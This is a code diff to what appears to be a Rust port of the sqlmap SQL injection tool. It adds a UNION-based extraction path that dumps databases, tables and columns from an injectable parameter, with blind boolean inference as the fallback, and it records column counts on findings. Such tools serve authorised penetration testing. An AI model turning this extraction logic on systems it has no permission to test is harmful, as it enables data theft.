@@ -116,14 +116,23 @@ impl<'a> Engine<'a> {
     /// --dbs/--tables/--columns/--dump via blind inference on a confirmed
     /// boolean injection (sqlmap `enumeration` phase over `inference`).
     fn run_enumeration(&mut self) {
-        let Some(inj) = self
+        // Prefer the UNION channel when a union finding carries a column count
+        // (one request per value); fall back to boolean blind inference.
+        let union_inj = self
+            .kb
+            .injections
+            .iter()
+            .find(|i| i.technique == Technique::Union && i.column_count.is_some())
+            .cloned();
+        let bool_inj = self
             .kb
             .injections
             .iter()
             .find(|i| i.technique == Technique::Boolean)
-            .cloned()
+            .cloned();
+        let Some((inj, via_union)) = union_inj.map(|i| (i, true)).or_else(|| bool_inj.map(|i| (i, false)))
         else {
-            self.say("enumeration skipped: needs a boolean-based injection point (blind inference); none found".to_string());
+            self.say("enumeration skipped: needs a boolean or UNION injection point; none found".to_string());
             return;
         };
         let all = params::extract_params(
@@ -141,28 +150,40 @@ impl<'a> Engine<'a> {
             ));
             return;
         };
-        self.say(format!(
-            "enumerating via blind inference on '{}' ({:?})",
-            param.name, param.place
-        ));
-        let orig = match self.fetch(&self.build_request(&param, &param.value)) {
-            Ok(r) => r,
-            Err(e) => {
-                self.say(format!("enumeration aborted: baseline refetch failed: {e}"));
-                return;
-            }
-        };
-        let mut ext = crate::exfil::BlindExtractor::new(
-            self.client,
-            self.conf,
-            param,
-            inj,
-            filtered_page(&orig.body),
-            self.conf.page_ratio_threshold,
-        );
-        let results = ext.run();
-        self.log.extend(ext.log);
-        self.kb.enumeration = results;
+        if via_union {
+            self.say(format!(
+                "enumerating via UNION channel on '{}' ({:?})",
+                param.name, param.place
+            ));
+            let mut ext = crate::exfil::UnionExtractor::new(self.client, self.conf, param, inj)
+                .expect("union finding carries a column count");
+            let results = ext.run();
+            self.log.extend(ext.log);
+            self.kb.enumeration = results;
+        } else {
+            self.say(format!(
+                "enumerating via blind inference on '{}' ({:?})",
+                param.name, param.place
+            ));
+            let orig = match self.fetch(&self.build_request(&param, &param.value)) {
+                Ok(r) => r,
+                Err(e) => {
+                    self.say(format!("enumeration aborted: baseline refetch failed: {e}"));
+                    return;
+                }
+            };
+            let mut ext = crate::exfil::BlindExtractor::new(
+                self.client,
+                self.conf,
+                param,
+                inj,
+                filtered_page(&orig.body),
+                self.conf.page_ratio_threshold,
+            );
+            let results = ext.run();
+            self.log.extend(ext.log);
+            self.kb.enumeration = results;
+        }
     }
 
     fn scan_param(&mut self, param: &Param) {
@@ -271,6 +292,7 @@ impl<'a> Engine<'a> {
                         payload: true_val,
                         dbms: dbms_hint.map(|s| s.to_string()),
                         note: format!("true page matches original (r={true_ratio:.3}), false page differs (r={false_ratio:.3})"),
+                        column_count: None,
                     });
                     return;
                 }
@@ -310,6 +332,7 @@ impl<'a> Engine<'a> {
                         payload: val,
                         dbms: Some(dbms.to_string()),
                         note: format!("{dbms} error contained payload marker '{marker}'"),
+                        column_count: None,
                     });
                     return;
                 }
@@ -364,7 +387,8 @@ impl<'a> Engine<'a> {
                         boundary: boundary.clone(),
                         payload: last_val,
                         dbms: dbms_hint.map(|s| s.to_string()),
-                        note: format!("column count = {count} (ORDER BY probing); UNION data exfiltration not ported"),
+                        note: format!("column count = {count} (ORDER BY probing)"),
+                        column_count: Some(count),
                     });
                     return;
                 }
@@ -411,6 +435,7 @@ impl<'a> Engine<'a> {
                         payload: val,
                         dbms: dbms_hint.map(|s| s.to_string()),
                         note: format!("two delayed responses >= {}s (baseline {:.2?})", self.conf.time_sec, baseline),
+                        column_count: None,
                     });
                     return;
                 }
